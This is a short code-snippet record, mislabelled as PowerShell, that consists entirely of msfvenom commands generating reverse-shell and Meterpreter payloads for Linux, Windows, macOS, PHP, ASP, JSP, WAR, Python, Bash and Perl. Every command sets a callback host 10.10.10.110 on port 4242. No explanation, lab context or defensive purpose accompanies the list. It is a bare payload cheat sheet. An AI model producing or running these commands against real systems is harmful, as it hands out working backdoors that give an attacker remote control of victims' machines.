---
id: 3f99d11b-8940-4381-9364-29676efe08d5
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:21.275112+00:00'
updated_at: '2023-04-10T20:25:02.587405+00:00'
---

# Code Snippet 3f99d11b

**Language**: Powershell

```powershell
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f elf > shell.elf
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe > shell.exe
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho > shell.macho
$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f asp > shell.asp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f war > shell.war
$ msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py
$ msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > shell.sh
$ msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
```


